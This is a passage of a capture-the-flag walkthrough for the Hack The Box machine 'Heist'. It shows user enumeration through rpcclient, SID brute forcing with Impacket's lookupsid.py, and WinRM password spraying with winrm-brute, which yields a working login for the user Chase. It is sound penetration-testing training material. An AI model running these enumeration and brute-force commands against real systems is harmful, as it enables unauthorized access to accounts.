# Enumeration -

Trying the found credentials to authenticate with rpcclient -

```bash
root@napster:~/Documents/HTB/Heist# rpcclient -U 'hazard%stealth1agent' 10.10.10.149
rpcclient $> enomdomusers
command not found: enomdomusers
rpcclient $> enumdomusers
result was NT_STATUS_CONNECTION_DISCONNECTED
rpcclient $> enumdomusers
result was NT_STATUS_CONNECTION_DISCONNECTED
rpcclient $> enumdomgroups
result was NT_STATUS_CONNECTION_DISCONNECTED
rpcclient $> lookupnames hazard
hazard S-1-5-21-4254423774-1266059056-3197185112-1008 (User: 1)
rpcclient $> lookupnames administrator
administrator S-1-5-21-4254423774-1266059056-3197185112-500 (User: 1)
```

We can enumerate users with SID's we gonna use `lookupsids.py` from `Imackets` to bruteforce -

```bash
root@napster:~/Documents/HTB/Heist# lookupsid.py hazard:stealth1agent@10.10.10.149
Impacket v0.9.22.dev1+20200909.150738.15f3df26 - Copyright 2020 SecureAuth Corporation

[*] Brute forcing SIDs at 10.10.10.149
[*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
500: SUPPORTDESK\Administrator (SidTypeUser)
501: SUPPORTDESK\Guest (SidTypeUser)
503: SUPPORTDESK\DefaultAccount (SidTypeUser)
504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
513: SUPPORTDESK\None (SidTypeGroup)
1008: SUPPORTDESK\Hazard (SidTypeUser)
1009: SUPPORTDESK\support (SidTypeUser)
1012: SUPPORTDESK\Chase (SidTypeUser)
1013: SUPPORTDESK\Jason (SidTypeUser)
```

We got some new users adding them to our user list -

```bash
root@napster:~/Documents/HTB/Heist# cat user.txt 
rout3r
admin
Hazard
support
Chase
Jason
```

### Winrm -

Using winrm to check if we can login into any of the above credentials

Win-rm doesnt support brute forcing so we gonna download -

[Winrm-brute](https://github.com/mchoji/winrm-brute)

```bash
root@napster:/opt# git clone https://github.com/mchoji/winrm-brute  
Cloning into 'winrm-brute'...          
remote: Enumerating objects: 20, done.                                                                                            
remote: Counting objects: 100% (20/20), done.                                                                                  
remote: Compressing objects: 100% (14/14), done.                                                                               
remote: Total 20 (delta 7), reused 15 (delta 6), pack-reused 0                                                         
Receiving objects: 100% (20/20), 10.52 KiB | 1.75 MiB/s, done.                    
Resolving deltas: 100% (7/7), done.
root@napster:/opt# cd winrm-brute/           
root@napster:/opt/winrm-brute# bundle config path vendor/bundle                                                                
root@napster:/opt/winrm-brute# bundle install
<Snip>
root@napster:/opt/winrm-brute# bundle exec ./winrm-brute.rb
Usage: winrm-brute.rb [options] HOST
    -u USER                          A specific username to authenticate as
    -U USERFILE                      File containing usernames, one per line
    -p PASSWORD                      A specific password to authenticate with
    -P PASSWORDFILE                  File containing passwords, one per line
    -t TIMEOUT                       Timeout for each attempt, in seconds (default: 1)
    -q, --quiet                      Do not write all login attempts
        --port=PORT                  The target TCP port (default: 5985)
        --uri=URI                    The URI of the WinRM service (default: /wsman)
    -h, --help                       Show this message
root@napster:/opt/winrm-brute# ls
Gemfile  Gemfile.lock  LICENSE  pass.txt  README.md  user.txt  vendor  winrm-brute.rb
root@napster:/opt/winrm-brute# bundle exec ./winrm-brute.rb -U user.txt -P pass.txt 10.10.10.149
Trying rout3r:stealth1agent
Trying rout3r:$uperP@ssword
Trying rout3r:Q4)sJu\Y8qz*A3?d
Trying admin:stealth1agent
Trying admin:$uperP@ssword
Trying admin:Q4)sJu\Y8qz*A3?d
Trying Hazard:stealth1agent
Trying Hazard:$uperP@ssword
Trying Hazard:Q4)sJu\Y8qz*A3?d
Trying support:stealth1agent
Trying support:$uperP@ssword
Trying support:Q4)sJu\Y8qz*A3?d
Trying Chase:stealth1agent
Trying Chase:$uperP@ssword
Trying Chase:Q4)sJu\Y8qz*A3?d
[SUCCESS] user: Chase password: Q4)sJu\Y8qz*A3?d
Trying Jason:stealth1agent
Trying Jason:$uperP@ssword
Trying Jason:Q4)sJu\Y8qz*A3?d
```

We got one successful hit-

Chase : Q4)sJu\Y8qz*A3?d